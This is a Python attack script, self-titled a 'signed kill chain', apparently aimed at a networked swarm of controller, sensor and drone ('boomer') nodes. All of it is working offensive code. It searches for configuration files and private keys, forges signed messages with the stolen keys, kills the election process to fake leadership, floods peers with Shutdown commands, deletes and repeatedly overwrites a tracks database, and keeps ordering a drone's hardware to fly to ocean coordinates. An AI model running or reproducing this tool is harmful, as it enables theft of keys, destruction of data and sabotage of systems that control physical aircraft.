#!/usr/bin/env python3
"""mantis.py v4 — fast signed kill chain, pure python ed25519"""
import json,os,re,socket,sqlite3,subprocess,sys,time,threading,uuid,glob,base64,hashlib
from typing import Optional,List,Tuple

# ── Ed25519 pure python (RFC 8032) ───────────────────────
_P=2**255-19; _L=2**252+27742317777372353535851937790883648493
_D=-121665*pow(121666,_P-2,_P)%_P; _I=pow(2,(_P-1)//4,_P)
def _inv(x): return pow(x,_P-2,_P)
def _recx(y,s):
    y2=y*y%_P; x2=(y2-1)*_inv(_D*y2+1)%_P
    if x2==0: return 0 if not s else (_ for _ in ()).throw(ValueError)
    x=pow(x2,(_P+3)//8,_P)
    if(x*x-x2)%_P!=0: x=x*_I%_P
    if x&1!=s: x=_P-x
    return x
def _padd(P,Q):
    x1,y1,z1,t1=P; x2,y2,z2,t2=Q
    A=(y1-x1)*(y2-x2)%_P; B=(y1+x1)*(y2+x2)%_P
    C=t1*2*_D*t2%_P; DD=z1*2*z2%_P
    E=B-A;F=DD-C;G=DD+C;H=B+A
    return(E*F%_P,G*H%_P,F*G%_P,E*H%_P)
def _pmul(s,P):
    Q=(0,1,1,0)
    while s>0:
        if s&1: Q=_padd(Q,P)
        P=_padd(P,P); s>>=1
    return Q
_By=4*_inv(5)%_P; _Bx=_recx(_By,0); _B=(_Bx,_By,1,_Bx*_By%_P)
def _enc(P):
    x,y,z,_=P; zi=_inv(z); x=x*zi%_P; y=y*zi%_P
    ba=bytearray(y.to_bytes(32,'little'))
    if x&1: ba[31]|=0x80
    return bytes(ba)
def _clamp(k):
    k=bytearray(k); k[0]&=248; k[31]&=127; k[31]|=64; return bytes(k)
def _sign(seed,msg):
    h=hashlib.sha512(seed).digest()
    a=int.from_bytes(_clamp(h[:32]),'little'); pfx=h[32:]
    A=_enc(_pmul(a,_B))
    r=int.from_bytes(hashlib.sha512(pfx+msg).digest(),'little')%_L
    R=_enc(_pmul(r,_B))
    k=int.from_bytes(hashlib.sha512(R+A+msg).digest(),'little')%_L
    S=(r+k*a)%_L
    return R+S.to_bytes(32,'little')
def _seed_from_pem(path):
    try:
        lines=[l.strip() for l in open(path).read().strip().split('\n') if not l.strip().startswith('-----')]
        der=base64.b64decode(''.join(lines))
        idx=der.rfind(b'\x04\x20')
        if idx>=0 and len(der)>=idx+34: return der[idx+2:idx+34]
    except: pass
    return None

_SEED=None
def init_key(path):
    global _SEED
    _SEED=_seed_from_pem(path)
    if _SEED: print(f"[+] Signing ready from {path}")
    else: print(f"[!] No key loaded from {path}")

# ── Transmission builder ─────────────────────────────────
def mktx(src,dst,mtype,payload=None):
    t={"destination":dst,"source":src,
       "msg":json.dumps(payload or{}),"msg_type":mtype,
       "msg_sig":"","nonce":"","authority":{"endorsements":[]}}
    if _SEED:
        nonce=base64.urlsafe_b64encode(os.urandom(16)).decode().rstrip("=")
        t["nonce"]=nonce
        material=(t["destination"]+t["source"]+t["msg"]+t["msg_type"]+t["nonce"]).encode()
        t["msg_sig"]=base64.b64encode(_sign(_SEED,material)).decode()
    return t

# ── Config ───────────────────────────────────────────────
def find_configs():
    found=[]
    for k in["CONTROLLER_CONFIG_PATH","SENSOR_CONFIG_PATH","BOOMER_CONFIG_PATH"]:
        v=os.environ.get(k)
        if v and os.path.isfile(v): found.append(v)
    for r in["/etc","/var/lib","/opt","/tmp","/run"]:
        try:
            for dp,ds,fs in os.walk(r):
                for f in fs:
                    if f.endswith((".yaml",".yml")):
                        fp=os.path.join(dp,f)
                        if fp not in found: found.append(fp)
                if dp.count(os.sep)-r.count(os.sep)>3: ds.clear()
        except: pass
    return found

def parse_yaml(path):
    try: text=open(path).read()
    except: return{}
    r={}; lk=None; ci=None
    for line in text.split("\n"):
        s=line.strip()
        if not s or s.startswith("#"): continue
        ind=len(line)-len(line.lstrip())
        m=re.match(r'^(\w[\w_]*):\s+(.+)$',s)
        if m and ind==0:
            k,v=m.group(1),m.group(2).strip().strip('"').strip("'")
            lk=None;ci=None
            for c in[lambda x:{"true":True,"false":False}[x.lower()],int,float]:
                try: v=c(v);break
                except: pass
            r[k]=v;continue
        m=re.match(r'^(\w[\w_]*):\s*$',s)
        if m and ind==0: lk=m.group(1);r[lk]=[];ci=None;continue
        if s.startswith("- ") and lk is not None:
            ci={};r[lk].append(ci)
            m=re.match(r'^-\s+(\w[\w_]*):\s*(.+)$',s)
            if m: ci[m.group(1)]=m.group(2).strip().strip('"').strip("'")
            continue
        m=re.match(r'^(\w[\w_]*):\s*(.+)$',s)
        if m and ind>0:
            k,v=m.group(1),m.group(2).strip().strip('"').strip("'")
            if ci is not None: ci[k]=v
            else: r[k]=v
    return r

def detect_type(c):
    if "election_socket_path" in c: return "controller"
    if "gps_db_path" in c: return "sensor"
    if "hw_socket_path" in c: return "boomer"
    return "unknown"

# ── IO helpers ───────────────────────────────────────────
def sock_send(path,data):
    try:
        s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
        s.settimeout(2);s.connect(path);s.sendall(json.dumps(data).encode());s.close()
        return True
    except: return False

def http_post(url,body):
    try:
        from urllib.parse import urlparse
        p=urlparse(url);host,port,path=p.hostname,p.port or 80,p.path or"/"
        pay=json.dumps(body).encode()
        req=(f"POST {path} HTTP/1.1\r\nHost:{host}:{port}\r\n"
             f"Content-Type:application/json\r\nContent-Length:{len(pay)}\r\n"
             f"Connection:close\r\n\r\n").encode()+pay
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.settimeout(3);s.connect((host,port));s.sendall(req)
        r=b""
        while True:
            try:
                c=s.recv(4096)
                if not c:break
                r+=c
            except:break
        s.close()
        m=re.search(r"HTTP/\d\.\d (\d{3})",r.decode("utf-8","replace"))
        return int(m.group(1)) if m else 0
    except: return 0

def election_query(path):
    try:
        s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
        s.settimeout(2);s.connect(path);raw=s.recv(409600).decode();s.close()
        return json.loads(raw)
    except: return None

# ── Recon (fast — no sniff) ──────────────────────────────
class Intel:
    def __init__(self):
        self.ntype="unknown";self.nid="";self.cfg={};self.cfgpath=""
        self.comms="";self.elect="";self.hw=""
        self.is_leader=False;self.ctrl_ids=[];self.ctrl_eps=[]
        self.sensor_ids=[];self.boomer_ids=[];self.all_ids=[]
        self.db="";self.key=""

def recon():
    print("="*60+"\n  RECON\n"+"="*60)
    I=Intel()
    cfgs=find_configs()
    if not cfgs: print("[-] No config");sys.exit(1)

    best,bp={},""
    ep={os.environ.get(k,"") for k in["CONTROLLER_CONFIG_PATH","SENSOR_CONFIG_PATH","BOOMER_CONFIG_PATH"]}
    for cp in cfgs:
        p=parse_yaml(cp)
        if not p.get("id"):continue
        if not best or cp in ep: best,bp=p,cp
    if not best: print("[-] No valid config");sys.exit(1)

    I.cfg,I.cfgpath=best,bp
    I.nid=str(best.get("id",""));I.ntype=detect_type(best)
    I.comms=str(best.get("comms_socket_path",""))
    I.elect=str(best.get("election_socket_path",""))
    I.hw=str(best.get("hw_socket_path",""))
    I.db=str(best.get("gps_db_path",""))
    print(f"[+] {I.ntype} / {I.nid}")

    # Key
    I.key=str(best.get("key_path",""))
    if not I.key or not os.path.isfile(I.key):
        for c in["/etc/controller/key.pem","/etc/sensor/key.pem","/etc/boomer/key.pem"]+glob.glob("/etc/*/*.pem"):
            if os.path.isfile(c): I.key=c;break
    if I.key: init_key(I.key)

    # Peers
    for lst,k in[(I.ctrl_ids,"controllers"),(I.sensor_ids,"sensors"),(I.boomer_ids,"boomers")]:
        for e in best.get(k,[]):
            if isinstance(e,dict) and e.get("id"):
                lst.append(e["id"])
                if k=="controllers": I.ctrl_eps.append(e.get("ip_addr",""))
    I.all_ids=list(set([I.nid]+I.ctrl_ids+I.sensor_ids+I.boomer_ids))

    # Leader check
    if I.elect and os.path.exists(I.elect):
        coa=election_query(I.elect)
        if coa:
            n=len(coa.get("endorsements",[]))
            I.is_leader=n>0
            print(f"[+] Leader: {I.is_leader} ({n} endorsements)")

    print(f"[*] {len(I.ctrl_ids)}C {len(I.sensor_ids)}S {len(I.boomer_ids)}B = {len(I.all_ids)} nodes")
    return I

# ── Kill Vectors ─────────────────────────────────────────

def v_comms_shutdown(I):
    """Queue signed Shutdowns for all nodes via comms socket.
    Workers get them when they poll. Peers get pushed by communicator."""
    print("\n[*] SHUTDOWN FLOOD via comms socket")
    if not I.comms or not os.path.exists(I.comms):
        print("[-] No comms socket");return 0
    sent=0
    for tid in I.all_ids:
        if tid==I.nid: continue
        if sock_send(I.comms,mktx(I.nid,tid,"Shutdown")):
            sent+=1
    print(f"[+] Queued {sent}/{len(I.all_ids)-1}")
    return sent

def v_http_shutdown(I):
    """POST Shutdown directly to peer controller HTTP endpoints."""
    print("\n[*] HTTP SHUTDOWN SPRAY")
    sent=0
    for i,ep in enumerate(I.ctrl_eps):
        if not ep:continue
        cid=I.ctrl_ids[i] if i<len(I.ctrl_ids) else ""
        st=http_post(ep,mktx(I.nid,cid,"Shutdown"))
        if st in(200,202): sent+=1;print(f"[+]  {ep} ({st})")
        else: print(f"[!]  {ep} ({st})")
    return sent

def v_boomer_misdirect(I):
    """Queue phantom engage requests — boomers waste their hunt slot."""
    print("\n[*] BOOMER MISDIRECT")
    if not I.comms or not os.path.exists(I.comms):return 0
    sent=0
    for bid in I.boomer_ids:
        t=mktx(I.nid,bid,"Boomer:Engage Request",
               {"track_id":f"x-{bid[:8]}","sensor_id":str(uuid.uuid4()),
                "sensor_host":"http://127.0.0.1:1/"})
        if sock_send(I.comms,t): sent+=1
    print(f"[+] Misdirected {sent}/{len(I.boomer_ids)}")
    return sent

def v_sqlite_poison(I):
    """Nuke tracks DB and keep it empty."""
    print("\n[*] SQLITE POISON")
    db=I.db
    if not db:
        for p in glob.glob("/var/lib/*/tracks.db")+glob.glob("/tmp/tracks.db"):
            db=p;break
    if not db or not os.path.isfile(db):
        print("[!] No tracks DB");return False
    try:
        c=sqlite3.connect(db);n=c.execute("SELECT COUNT(*) FROM tracks").fetchone()[0]
        c.execute("DELETE FROM tracks");c.commit();c.close()
        print(f"[+] Deleted {n} tracks")
        def wipe():
            for _ in range(600):
                try:c2=sqlite3.connect(db);c2.execute("DELETE FROM tracks");c2.commit();c2.close()
                except:pass
                time.sleep(0.5)
        threading.Thread(target=wipe,daemon=True).start()
        return True
    except Exception as e:print(f"[-] {e}");return False

def v_hw_divert(I):
    """Send GO_TO to fly boomer into ocean + keep overriding."""
    print("\n[*] HW DIVERT")
    if not I.hw or not os.path.exists(I.hw):
        print("[!] No hw socket");return False
    cmd={"command":"GO_TO","latitude":70.0,"longitude":-30.0,"altitude":10.0}
    try:
        s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
        s.settimeout(2);s.connect(I.hw)
        s.sendall(json.dumps(cmd).encode());r=s.recv(4096);s.close()
        print(f"[+] GO_TO sent")
        def loop():
            for _ in range(300):
                try:
                    s2=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
                    s2.settimeout(2);s2.connect(I.hw)
                    s2.sendall(json.dumps(cmd).encode());s2.recv(4096);s2.close()
                except:pass
                time.sleep(1)
        threading.Thread(target=loop,daemon=True).start()
        return True
    except Exception as e:print(f"[-] {e}");return False

def v_track_divert(I):
    """Replace track coords with ocean + keep overwriting."""
    print("\n[*] TRACK DIVERT")
    db=I.db
    if not db or not os.path.isfile(db):print("[!] No DB");return False
    try:
        c=sqlite3.connect(db)
        n=c.execute("UPDATE tracks SET latitude=58.0,longitude=-52.0").rowcount
        c.commit();c.close();print(f"[+] Diverted {n} tracks")
        def loop():
            for i in range(600):
                try:
                    c2=sqlite3.connect(db)
                    c2.execute("UPDATE tracks SET latitude=?,longitude=?",(58.0+(i%10)*0.01,-52.0))
                    c2.commit();c2.close()
                except:pass
                time.sleep(0.5)
        threading.Thread(target=loop,daemon=True).start()
        return True
    except Exception as e:print(f"[-] {e}");return False

# ── Kill Chain ───────────────────────────────────────────
def kill(I):
    print(f"\n{'='*60}\n  KILL — {I.ntype.upper()}\n{'='*60}")

    if I.ntype=="controller":
        # We're already leader (or we forge) — queue shutdowns
        if not I.is_leader:
            print("[!] Not leader — forging...")
            # Kill election, replace socket with forged COA
            try:subprocess.run(["pkill","-9","election"],capture_output=True,timeout=2)
            except:pass
            time.sleep(0.3)
            try:
                if os.path.exists(I.elect):os.unlink(I.elect)
            except:pass
            now=time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime())
            exp=time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime(time.time()+7200))
            es=[{"valid_after":now,"expiration":exp,"endorser":c,"endorsee":I.nid,"signature":""}
                for c in I.ctrl_ids+[I.nid]]
            pay=json.dumps({"endorsements":es}).encode()
            def serve():
                try:
                    sv=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM)
                    sv.bind(I.elect);os.chmod(I.elect,0o777);sv.listen(32);sv.settimeout(1)
                    while True:
                        try:c2,_=sv.accept();c2.sendall(pay);c2.close()
                        except socket.timeout:continue
                        except:pass
                except:pass
            threading.Thread(target=serve,daemon=True).start()
            time.sleep(1)
            I.is_leader=True

        v_comms_shutdown(I)
        v_http_shutdown(I)
        v_boomer_misdirect(I)

    elif I.ntype=="sensor":
        v_sqlite_poison(I)
        v_track_divert(I)
        v_comms_shutdown(I)

    elif I.ntype=="boomer":
        v_hw_divert(I)
        v_comms_shutdown(I)

    else:
        v_comms_shutdown(I)
        v_sqlite_poison(I)

    print(f"\n{'='*60}\n  DONE\n{'='*60}")

def main():
    mode=sys.argv[1].lower() if len(sys.argv)>1 else "auto"
    print(f"\033[91m\033[1m  HYDRA v4\033[0m\033[2m • signed kill chain\033[0m\n")
    I=recon()
    if mode=="recon": return
    if mode=="divert":
        if I.ntype=="sensor": v_track_divert(I);v_sqlite_poison(I)
        elif I.ntype=="boomer": v_hw_divert(I)
        return
    kill(I)  # auto or kill

if __name__=="__main__":
    main()